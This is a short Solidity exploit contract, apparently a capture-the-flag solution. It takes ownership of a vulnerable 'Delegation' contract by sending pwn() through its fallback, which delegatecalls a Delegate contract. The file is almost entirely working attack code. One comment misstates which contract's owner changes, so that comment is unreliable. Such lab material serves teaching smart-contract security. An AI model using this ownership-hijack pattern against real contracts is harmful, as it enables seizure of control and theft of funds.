// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import { Delegate, Delegation } from './Delegation.sol';

interface IDelegate {
    function pwn() external;
}

contract Attack {
    address public owner; 

    Delegation internal delegation;
    IDelegate internal delegate;

    constructor(address _delegation, address _delegate) {
        delegation = Delegation(_delegation);
        delegate = IDelegate(_delegate);
    }

    // call the pwn() function on the delegate contract to take control
    // we can trigger the fallback of the Delegation function by calling 
    // pwn() since it doesn't actually exist on the contract. the fallback
    // will then delegatecall the delegate contract with our data for the pwn()
    // function. this will set us to be the owners of the Delegate contract
    function attack() public {
        bytes memory data = abi.encodeWithSignature('pwn()');
        (bool success, ) = address(delegation).call(data);
        require(success, 'Delegate call failed');
    }
}